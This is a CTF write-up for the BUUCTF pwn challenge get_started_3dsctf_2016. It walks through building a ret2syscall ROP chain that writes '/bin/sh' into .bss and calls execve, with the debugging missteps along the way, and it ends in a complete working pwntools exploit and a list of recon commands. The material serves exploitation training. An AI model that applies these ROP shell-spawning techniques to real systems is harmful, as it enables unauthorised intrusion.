# get_started_3dsctf_2016 — the long way: full ret2syscall shell

**BUUCTF · PWN · Easy** — a 32-bit, statically-linked, no-frame-pointer stack overflow. Two separate exploitation paths against the same bug: first a ret2win that passes stack-based arguments to an argument-gated flag printer, then a full `execve("/bin/sh", NULL, NULL)` built entirely from ROP gadgets, writing the string itself into `.bss` to sidestep ASLR on the stack. This write-up documents every command run, every wrong turn, and why each fix worked — not just the final working exploit.



## Part 1 — From flag-reader to shell: full ret2syscall

The ret2win above only prints a file; it does not spawn a shell. Getting an actual interactive shell out of this binary required a completely different, more general technique, since no `system()`-calling function exists anywhere in it:

```bash
nm -C ./start | grep -w "T system"
# (no output — system() isn't linked in at all)
```

### Why ret2libc-style approaches don't apply here

The binary is statically linked, but the linker only pulls in functions the program actually calls somewhere — `system()` was never referenced, so it was never linked in. The only way forward is calling the kernel directly via a raw `int 0x80` syscall, bypassing libc wrappers entirely.

### The plan: execve("/bin/sh", NULL, NULL) via raw syscall

```
eax = 11          (execve syscall number)
ebx = pointer to "/bin/sh"
ecx = 0            (argv)
edx = 0            (envp)
int 0x80
```

### Finding gadgets

```bash
ROPgadget --binary ./start | grep "pop eax"
ROPgadget --binary ./start | grep "pop ebx"
ROPgadget --binary ./start | grep "int 0x80"
```

Selected:
```
0x080b91e6 : pop eax ; ret
0x0806fc2b : adc eax, _dl_sysinfo ; pop edx ; pop ecx ; pop ebx ; ret
```

The second gadget's leading `adc eax, ...` is harmless noise — it's immediately followed by three clean pops, and `eax` gets overwritten again later anyway.

### Why the stack address for "/bin/sh" doesn't work remotely

An early version wrote `"/bin/sh\0"` at the start of the payload itself and pointed `ebx` at its stack address, read directly from GDB:

```
(gdb) x/x $esp
0xffffd420: 0xffffd424
```

This worked *inside that one GDB session* and nowhere else:

```
[*] Got EOF while reading in interactive
Process './start' stopped with exit code -11 (SIGSEGV)
```

```
timeout: the monitored command dumped core
```

Root cause: checksec's `No PIE` only pins down the addresses of the binary's own code — the **stack** is governed by ASLR independently of PIE, randomized by the kernel on every real execution. GDB disables ASLR by default for its own child processes for debugging convenience, which is why the address looked stable there and nowhere else. The fix: never hardcode a stack address; use a location whose address is fixed regardless of ASLR.

### Writing "/bin/sh" into .bss instead — a location immune to ASLR

```bash
readelf -S ./start | grep -A1 "\.bss"
# [24] .bss   NOBITS   080ebf80 0a2f80 000e0c 00  WA  0   0 32
```

`.bss` is part of the binary's own static layout; since PIE is off, its address (`0x080ebf80`) is identical on every run, local or remote, with or without ASLR on the stack.

```bash
ROPgadget --binary ./start | grep -E "mov dword ptr \[e(a|b|c|d)x\], e" | grep -v "call\|jmp" | head -20
```

Selected a write-what-where gadget:
```
0x0809fc43 : mov dword ptr [eax], edx ; add esp, 8 ; pop ebx ; ret
```

`eax` holds the destination address, `edx` holds the 4 bytes to write. The gadget consumes 12 bytes of stack afterward total (`add esp,8` plus the following `pop ebx`), which has to be padded exactly — not approximately — in the chain.

```python
def write_chunk(addr, data):
    chunk  = p32(POP_EDX_ECX_EBX) + p32(data) + p32(0) + p32(0)
    chunk += p32(POP_EAX) + p32(addr)
    chunk += p32(WRITE_EAX_EDX) + p32(0) + p32(0) + p32(0)
    return chunk
```

### Debugging the write — confirming each 4-byte chunk lands correctly

```bash
gdb ./start
(gdb) break *0x0809fc43
(gdb) run < payload.bin
(gdb) p/x $eax
(gdb) p/x $edx
(gdb) continue
(gdb) p/x $eax
(gdb) p/x $edx
```

First pass confirmed `eax = 0x80ebf80`, `edx` = the bytes for `/bin`; continuing to the second hit confirmed `eax = 0x80ebf84`, `edx` = the next chunk. Inspecting the written memory directly:

```
(gdb) x/8xb 0x80ebf80
```

### Wrong int 0x80 gadget — borrowing from inside a real function is risky

An early version pointed the final jump at an `int 0x80` found inside glibc's `_exit()`:

```asm
0x806d7e0 <_exit+15>   mov eax, 1        ; <-- silently overwrites eax right before int 0x80
0x806d7e5 <_exit+20>   int 0x80
```

Landing mid-function at just the `int 0x80` instruction doesn't skip the instructions *before* it that are still part of the same function body. The `mov eax, 1` executed unconditionally right before the syscall, silently replacing the carefully-set `eax = 11` (execve) with `eax = 1` (`exit`) — so the chain ran `exit(ebx)` instead of `execve(...)`, landing on `_exit`'s trailing `hlt` and crashing.

Fix: picked a gadget made of nothing but `nop` instructions and a bare `int 0x80`, with nothing upstream that could clobber a register:

```bash
ROPgadget --binary ./start | grep "int 0x80"
```
```
0x080701cf : nop ; int 0x80
```

**Lesson carried forward:** a gadget borrowed from inside a real library function needs its surrounding disassembly checked, not just the instruction at the target address — instructions immediately before it are still "inside" the function and will execute too.

### The off-by-one-slash bug — reading the syscall's own error code

With the corrected `int 0x80` gadget, the chain still crashed:

```
EAX  0xfffffffe
```

Reading `0xfffffffe` as a signed 32-bit value gives `-2`, which on Linux is `-ENOENT` — "no such file or directory." The syscall *executed correctly* (proving the register setup and gadget chain were otherwise sound); it just failed to find the path it was given. Inspecting the actual bytes written to `.bss`:

```
EBX  0x80ebf80 (completed) ◂— '/binsh'
```

The two 4-byte writes were `/bin` followed by `sh\x00\x00` — concatenating to `"/binsh\0\0"`, missing the separating `/`. Fixed by writing `"/sh\x00"` as the second chunk instead:

```python
rop  = write_chunk(BSS_ADDR,     u32(b"/bin"))
rop += write_chunk(BSS_ADDR + 4, u32(b"/sh\x00"))   # the missing slash
```

**Lesson:** after any syscall whose result doesn't match expectations, read `eax` as a signed value before assuming the gadget chain itself is broken — a negative return is glibc's own error code telling you exactly what went wrong, rather than a generic crash to debug blind.

---

## Part 2 — Final, complete exploit

```python
from pwn import *

context.arch = 'i386'

p = remote('<host>', <port>)   

PADDING          = 56
BSS_ADDR         = 0x080ebf80
POP_EDX_ECX_EBX  = 0x0806fc2b   # adc eax,... ; pop edx ; pop ecx ; pop ebx ; ret
POP_EAX          = 0x080b91e6   # pop eax ; ret
WRITE_EAX_EDX    = 0x0809fc43   # mov [eax], edx ; add esp,8 ; pop ebx ; ret
INT_0x80         = 0x080701cf   # nop ; int 0x80  (clean, no clobbering instructions before it)

def write_chunk(addr, data):
    chunk  = p32(POP_EDX_ECX_EBX) + p32(data) + p32(0) + p32(0)
    chunk += p32(POP_EAX) + p32(addr)
    chunk += p32(WRITE_EAX_EDX) + p32(0) + p32(0) + p32(0)
    return chunk

rop  = write_chunk(BSS_ADDR,     u32(b"/bin"))
rop += write_chunk(BSS_ADDR + 4, u32(b"/sh\x00"))

# execve("/bin/sh", NULL, NULL)
rop += p32(POP_EDX_ECX_EBX) + p32(0) + p32(0) + p32(BSS_ADDR)   # edx=0, ecx=0, ebx=&"/bin/sh"
rop += p32(POP_EAX) + p32(0xb)                                    # eax = 11 (execve)
rop += p32(INT_0x80)

payload = b'A' * PADDING + rop

p.sendline(payload)
p.interactive()
```

This lands a fully interactive `/bin/sh`, not just a file read — `ls`, `cat flag`, `whoami`, and arbitrary commands all work from here.

---

## Part 3 — Every command used, in order

```bash
# Recon
file ./start
pwn checksec ./start
objdump -d ./start | grep -A5 "win\|shell\|flag\|system"
nm -C ./start | grep -iE " T (main|vuln)"
objdump -d -M intel ./start | grep -B2 -A 60 "<main>:"
objdump -s -j .rodata ./start
strings -t x ./start

# Building and inspecting a raw payload (never type raw bytes into a terminal)
python3 -c "
import struct
payload = b'A'*56 + struct.pack('<I', 0x080489a0) + b'B'*4 + struct.pack('<I', 0x308cd64f) + struct.pack('<I', 0x195719d1)
import sys
sys.stdout.buffer.write(payload)
" > payload.bin
xxd payload.bin

# GDB verification (ret2win stage)
gdb ./start
(gdb) break *0x80489a4
(gdb) run < payload.bin
(gdb) x/2xw $esp+0x10
(gdb) continue

# Finding the exit() address to survive stdio buffering
nm -C ./start | grep -w "T exit"

# Confirming system() isn't linked in at all
nm -C ./start | grep -w "T system"

# Gadget hunting for ret2syscall
ROPgadget --binary ./start | grep "pop eax"
ROPgadget --binary ./start | grep "pop ebx"
ROPgadget --binary ./start | grep "int 0x80"
ROPgadget --binary ./start | grep -E "mov dword ptr \[e(a|b|c|d)x\], e" | grep -v "call\|jmp" | head -20

# Finding a fixed, ASLR-immune write location
readelf -S ./start | grep -A1 "\.bss"

# Confirming the stack-address leak only works inside GDB's own session
gdb ./start
(gdb) break *0x8048a36
(gdb) run
(gdb) x/x $esp

# GDB verification (ret2syscall stage) — checked at every gadget boundary
gdb ./start
(gdb) break *0x0809fc43
(gdb) run < payload.bin
(gdb) p/x $eax
(gdb) p/x $edx
(gdb) continue
(gdb) x/8xb 0x80ebf80
(gdb) break *0x080701cf
(gdb) continue
(gdb) info registers eax ebx ecx edx
(gdb) continue
```

---

## Key takeaways

- **32-bit cdecl changes everything about argument passing.** Arguments travel on the stack, not in registers — hijacking a function that expects arguments means planting those values at the right stack offsets *after* a fake return address for that function, not just jumping to its entry point.
- **No frame pointer means no `+4`/`+8` padding bonus.** Always check for `push ebp; mov ebp, esp` before reusing a padding formula from a previous binary; without it, offsets come directly from `sub esp, N` and the buffer's `esp`-relative address.
- **A crash can destroy output that was technically already "printed."** Any time a hijacked function's own return value matters, consider chaining into `exit()` (or another buffer-flushing function) rather than an arbitrary address — unflushed stdio buffers vanish on SIGSEGV.
- **"No PIE" only pins the binary's own code and data — not the stack.** The stack remains subject to ASLR independently, and GDB's default ASLR-disabling for its own child processes can make a stack address look deceptively stable when debugging, right up until it fails identically on every non-GDB run, local or remote.
- **Writing attacker-controlled strings into `.bss` (not the stack) sidesteps stack ASLR entirely**, since `.bss`'s address is fixed by the binary's own layout whenever PIE is off.
- **A gadget living inside a real library function isn't automatically safe** — instructions immediately before your target address are still part of that function and will execute, potentially clobbering a register your chain depends on. Check the surrounding disassembly, not just the one instruction you intended to land on.
- **Read the syscall's own return value in `eax` as a signed number before assuming a chain is structurally broken.** A negative value is glibc/kernel's own error code (`-2` = `ENOENT`, etc.) and often points straight at the actual bug — in this case, a single missing `/` between two 4-byte writes.

---

